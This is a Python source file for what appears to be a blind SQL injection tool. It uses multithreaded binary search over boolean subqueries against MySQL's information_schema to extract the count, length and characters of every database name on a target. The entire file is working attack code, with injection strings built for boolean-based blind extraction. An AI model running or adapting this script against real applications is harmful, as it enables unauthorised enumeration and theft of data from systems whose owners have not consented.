import threading
import core

class Database:
    def __init__(self, name):
        self.name = name
        self.tables = []

    def add_table(self, table_name):
        if table_name not in self.tables:
            self.tables.append(table_name)

class DatabaseCharacterTester(threading.Thread):
    def __init__(self, position, index):
        super(DatabaseCharacterTester, self).__init__()
        self.position = position
        self.index = index
        self.character = -1

    def run(self):
        self.character = self.get_char()
        while self.character == -1:
            self.get_char()

    def test_character(self, character, position, operation=">="):
        injection_string = "(SELECT count(*) FROM (SELECT SCHEMA_NAME from information_schema.SCHEMATA LIMIT %d,1) as temp where ASCII(SUBSTRING(SCHEMA_NAME, %d, 1))%s%d)" % (self.index - 1, position, operation, character)
        return core.check_truth(injection_string)

    def get_char(self):
        min_char = 1
        max_char = 128
        character = (min_char + max_char) / 2

        while True:
            length_check = self.test_character(character, self.position)
            core.println("Checked character %d for index %d for position %d: %s" % (character, self.index, self.position, length_check))
            if length_check:
                min_char = character
            else:
                max_char = character - 1

            if min_char == max_char or max_char - min_char == 1:
                min_length_check = self.test_character(min_char, self.position, "=")
                if min_length_check:
                    core.println("Found character %d for index %d for position %d" % (min_char, self.index, self.position))
                    return min_char
                max_length_check = self.test_character(max_char, self.position, "=")
                if max_length_check:
                    core.println("Found character %d for index %d for position %d" % (max_char, self.index, self.position))
                    return max_char
                return -1

            character = (min_char + max_char) / 2

        return -1


class DatabaseBruteForcer(threading.Thread):
    def __init__(self, index):
        super(DatabaseBruteForcer, self).__init__()
        self.character_count = -1
        self.found_characters = ""
        self.index = index

    def get_name(self):
        return self.found_characters

    def run(self):
        self.get_characters()

    def get_characters(self):
        self.found_characters = ""
        self.character_count = self.get_length()

        for j in range((self.character_count // 10) + 1):
            database_character_testers = []
            for i in range(j * 10, (j + 1) * 10):
                if i < self.character_count:
                    database_character_tester = DatabaseCharacterTester(i + 1, self.index)
                    database_character_tester.start()
                    database_character_testers.append(database_character_tester)

            for database_character_tester in database_character_testers:
                database_character_tester.join()
                self.found_characters += chr(database_character_tester.character)

        core.println("Found database name at index %d is %s" % (self.index, self.found_characters))

    def check_count(self, count, operation = ">="):
        injection_string = "(SELECT count(*) FROM (SELECT SCHEMA_NAME from information_schema.SCHEMATA LIMIT %d,1) as temp where length(SCHEMA_NAME)%s%d)" %(self.index - 1, operation, count)
        return core.check_truth(injection_string)


    def get_length(self):
        min_count = 1
        max_count = 64

        count = (min_count + max_count) / 2

        while True:
            count_check = self.check_count(count)
            core.println("Checked database length for index %d count %d: %s" % (self.index, count, count_check))
            if count_check:
                min_count = count
            else:
                max_count = count - 1

            if min_count == max_count or max_count - min_count == 1:
                min_count_check = self.check_count(min_count, "=")
                if min_count_check:
                    core.println("Found database length for index %d count %d" % (self.index, min_count))
                    return min_count
                max_count_check = self.check_count(max_count, "=")
                if max_count_check:
                    core.println("Found database length for index %d count %d" % (self.index, max_count))
                    return max_count
                break

            count = (min_count + max_count) / 2
        return -1

class DatabaseDetector:
    def __init__(self):
        self.databases = []

    def start(self):
        pass

    def check_count(self, count, operation = ">="):
        injection_string = "(SELECT count(*) from information_schema.SCHEMATA)%s%d" %(operation, count)
        return core.check_truth(injection_string)

    def get_count(self):
        min_count = 1
        max_count = 1024

        count = (min_count + max_count) / 2

        while True:
            count_check = self.check_count(count)
            core.println("Checked count %d: %s" % (count, count_check))
            if count_check:
                min_count = count
            else:
                max_count = count - 1

            if min_count == max_count or max_count - min_count == 1:
                min_count_check = self.check_count(min_count, "=")
                if min_count_check:
                    core.println("Found count %d" % min_count)
                    return min_count
                max_count_check = self.check_count(max_count, "=")
                if max_count_check:
                    core.println("Found count %d" % max_count)
                    return max_count
                break

            count = (min_count + max_count) / 2
        return -1

    def get_databases(self):
        database_count = self.get_count()
        core.println("Found %d databases\n" % database_count)

        database_brute_forcers = []
        for i in range(database_count):
            database_brute_forcer = DatabaseBruteForcer(i + 1)
            database_brute_forcer.start()
            database_brute_forcer.join()
            database_brute_forcers.append(database_brute_forcer)

        self.databases = []

        for database_brute_forcer in database_brute_forcers:
            # database_brute_forcer.join()
            core.println("Found database: %s" % database_brute_forcer.get_name())
            self.databases.append(Database(database_brute_forcer.get_name()))




if __name__ == '__main__':
    core.read_cache()
    database_detector = DatabaseDetector()
    database_detector.get_databases()